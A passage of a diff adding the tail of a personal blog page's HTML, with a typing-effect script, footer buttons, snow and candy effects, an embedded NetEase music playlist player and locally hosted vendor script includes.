+      b = ["rgb(110,64,170)", "rgb(150,61,179)", "rgb(191,60,175)", "rgb(228,65,157)", "rgb(254,75,131)", "rgb(255,94,99)", "rgb(255,120,71)", "rgb(251,150,51)", "rgb(226,183,47)", "rgb(198,214,60)", "rgb(175,240,91)", "rgb(127,246,88)", "rgb(82,246,103)", "rgb(48,239,130)", "rgb(29,223,163)", "rgb(26,199,194)", "rgb(35,171,216)", "rgb(54,140,225)", "rgb(76,110,219)", "rgb(96,84,200)"],
+      c = {
+        text: "",
+        prefixP: -s,
+        skillI: 0,
+        skillP: 0,
+        direction: "forward",
+        delay: a,
+        step: g
+      };
+      i()
+      };
+      binft(document.getElementById('binft'));
+  </script>
+                    </ul>
+                </div>
+            </div>
+        </div>
+        <div class="kr-tool text-center">
+            <div class="tool">
+                
+                    <div class="box search-box">
+                        <a href="/search/">
+                            <span class="fa fa-search"></span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="box theme-box" id="darkmode-switch">
+                        <span class="fa fa-adjust"></span>
+                    </div>
+                
+                
+            </div>
+            <div class="box gotop-box">
+                <span class="fa fa-chevron-up"></span>
+            </div>
+        </div>
+    </div>
+</footer>
+</div>
+</div>
+
+
+        <script defer src="/vendors/bootstrap@3.3.4/dist/js/bootstrap.min.js"></script>
+<script defer src="/vendors/nprogress@0.2.0/nprogress.js"></script>
+<script>
+    if (!window.kr) {
+        window.kr = {};
+    }
+    window.kr.notMobile = (!(navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i)));
+    window.kr.siteRoot = "/";
+</script>
+
+    <div>
+        <canvas id="snow"></canvas>
+        <script async src="/js/snow.min.js"></script>
+    </div>
+
+
+    <script async src="/js/candy.min.js"></script>
+
+
+
+    <script defer src="/vendors/aplayer@1.10.1/dist/APlayer.min.js"></script>
+    
+    <script defer src="/vendors/meting@2.0.1/dist/Meting.min.js"></script>
+    <meting-js
+        server="netease"
+        type="playlist"
+        id="7733928587"
+        order="random"
+        fixed="true"
+    >
+    </meting-js>
+
+
+
+    <script defer src="/vendors/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+
+<script defer src="/vendors/clipboard@2.0.6/dist/clipboard.min.js"></script>
+<script defer src="/js/kratosr.min.js"></script>
+<script defer src="/js/pjax.min.js"></script>
+
+    <script defer src="/vendors/layui-src@2.5.5/dist/layui.all.js"></script>
+
+
+
+<!-- Extra support for third-party plguins  -->
+
+
+
+    </body>
+</html>
